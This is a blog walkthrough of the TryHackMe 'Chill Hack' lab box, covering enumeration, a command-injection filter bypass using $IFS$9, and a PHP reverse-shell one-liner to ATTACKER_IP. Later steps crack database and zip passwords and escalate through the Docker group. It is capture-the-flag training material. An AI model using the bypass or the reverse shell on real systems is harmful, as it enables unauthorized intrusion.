---
layout: post
title: THM Chill Hack writeup
excerpt_separator: <!--more-->
---
<img src="/img/chillhack/0.head.png">
<!--more-->
<a href="https://tryhackme.com/room/chillhack" target="_blank" > Click here to access this box on TryHackMe.com</a>
<hr>
<h1>ENUMERATION:</h1>
<hr>
<p>Let's start by scanning for open ports with NMAP.</p>
<p>In the output below we can see that FTP (port 21) and SSH (port 22) are open. There’s also an apache  web server running on port 80.</p>
<img src="/img/chillhack/1.nmap.png">

<p>First let see what's in the note.txt file on the FTP service since anonymous login is allowed.</p>
<p>login with “anonymous:anonymous”.</p>
<img src="/img/chillhack/2.ftp-login.png">

<p>Download (GET) the note.txt file.</p>
<img src="/img/chillhack/3.ftp-note-dl.png">

<p>Read the contents of the file.</p>
<p> This isn’t very helpful right now but will take note of this. </p>
<p> Let’s enumerate the webserver in our web browser.</p>
<img src="/img/chillhack/4.note-text.png">

<p>We have a web page that appears to be dedicated to  pseudo soccer teams.</p>
<p>I spent some time enumerating all the input fields and links. All of them appear to be “dummy” place holders.</p>  
<img src="/img/chillhack/5.home-webpage.png">

<p>Let’s try and enumerate the sub directories by using gobuster.</p>
<img src="/img/chillhack/6.dirbuster.png">

<p>From the output below we see there’s a directory named “secret”. Let’s navigate to the page</p>
<img src="/img/chillhack/7.dirbuster2.png">

<p>When we navigate to that page we’re presented with an input box that says "command". Oaky,Let’s try and issue some commands. Since we know from NMAP this is most likely running on a Linux, let’s try some bash commands.</p>
<img src="/img/chillhack/8.secret-page.png">

<p>If we type “id" command we get a response in our web browser. Let’s try and use net cat to get a basic reverse shell.</p>
<img src="/img/chillhack/9.id-input.png">

<p>First let’s set up a listener on our attacking machine to catch the shell.</p>
<img src="/img/chillhack/10.nc-listner.png">

<p>Okay, I didn't think it would be that easy. This must be what the note.txt in the FTP server was speaking to. They're filtering out some keywords - “nc” appears to be one.</p>
<img src="/img/chillhack/11.nc-fail.png">

<p>I tried using Burp Suite to send the POST request to try and bypass any client side scripting that may be filtering input data. That didn’t work.</p>
<img src="/img/chillhack/12.burp.png">
<hr>
<h1>GAINING A FOOTHOLD:</h1>
<hr>
<p>After fuzzing the input data for a while, I found a way to defeat the input filtering by using “$IFS$9” (this will be interpreted as a white space on the server). I’m assuming there’s an input validation that has a hard coded list of keywords. E.g.  'nc', 'python', 'bash','php','perl', etc… If we take the command “nc -e” and replace the withe space with “nc$IFS$9-e” we can get the command to execute without triggering the input validation filter.  </p>
<img src="/img/chillhack/13.input-trick.png">

<p>Altho this trick worked I couldn’t get a shell to “pop” using any net cat commands. I used a PHP one-liner and “popped” a reverse shell: php$IFS$9-r '$sock=fsockopen("ATTACKER_IP",PORT_NUM);exec("/bin/sh -i <&3 >&3 2>&3");'  </p>
<img src="/img/chillhack/14.php-1liner.png">

<p>...and we have a non interactive shell running as www-data. Let’s upgrade this to pseudo interactive. Read more about upgragding your shell to fully interactive here <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" target="blank"> here</a> </p>
<img src="/img/chillhack/15.first-shell.png"></p>

<p>Using this Python command we can get a pseudo interactive shell and start enumerating.</p>
<img src="/img/chillhack/16.psudo-i-shell.png">

<p>Looking through the file system there's an interesting  directory named “files” that we have read access to. There’s also a folder named images. I downloaded all these files by setting up a simple python and issuing a wget command from my machine.</p>
<img src="/img/chillhack/17.files.png">

<p>When we cat the index.php file we find a MySql user name and password. Let’s note these and see if we can connect to the MySql server. </p>
<img src="/img/chillhack/18.mysql-creds.png">

<p>We’re connected to the SQL database. Let’s begin enumerating.</p>
<img src="/img/chillhack/19.mysql-login.png">

<p>The webportal table looks interesting. Let’s see what  tables it has.</p>
<img src="/img/chillhack/20.mysql-tables.png">

<p>Let’s see if we can get any user creds from this table.</p>
<img src="/img/chillhack/21.mysql-table.png">

<p>Great, we have usernames and passwords. These passwords are hashed with  MD5. Let see if Crakstation.net can crack these before we try hashcat.</p>
<img src="/img/chillhack/22.user-password-hashed.png">

<p>They were very weak passwords and crackstation.net was able to crack both. Let’s note the user names and password and keep enumerating. </p>
<img src="/img/chillhack/23.crack-station.png">

<p>Let’s check the images we download from the images folder on the server. First let’s try the .jpg and see if these any hidden data in it.</p>
<img src="/img/chillhack/">

<p>Using steghide I was able to extract a file named backup.zip. Let’s unzip and see what’s inside.</p>
<img src="/img/chillhack/24.backup-.zip-file.png">

<p>It’s password protected. I tried the three passwords I captured earlier but these didn’t work. let ‘s try and bruteforce the password.</p>
<img src="/img/chillhack/25.unzip-pass-pro.png">

<p>using fcrackzip and the rockyou password list it quickly found the password.</p>
<img src="/img/chillhack/26.zip_password-cracked.png">

<p>Let’s see what’s inside. When we unzip the file we find another file named source_code.php. There’s credentials hardcoded in this php, but it’s base64 encoded.</p>
<img src="/img/chillhack/27.creds-again.png">

<p>Let’s decode the password.</p>
<img src="/img/chillhack/28.base64-d.png">

<p>Let’s see if we can use these creds to ssh in so we have a more stable shell</p>
<img src="/img/chillhack/">
<hr>
<h1>PRIVILEGE ESCALATION:</h1>
<hr>
<p>Success. Now let’s enumerate for priv esc.</p>
<img src="/img/chillhack/29.ssh-shell.png">

<p>We’re in the Docker group. This looks like a potential priv esc path.</p>
<img src="/img/chillhack/30.docker-group.png">

<p>A quick check on GTFO bins.</p>
<img src="/img/chillhack/31.gtfo-bins.png">
<p>And we are root. Let’s cat our flags.</p>
<img src="/img/chillhack/32.we-are-root.png">
<p>User flag.</p>
<img src="/img/chillhack/33.user-flag.png">
<p>And the root flag. This was a really fun box!!</p>
<img src="/img/chillhack/34.root-flag.png">




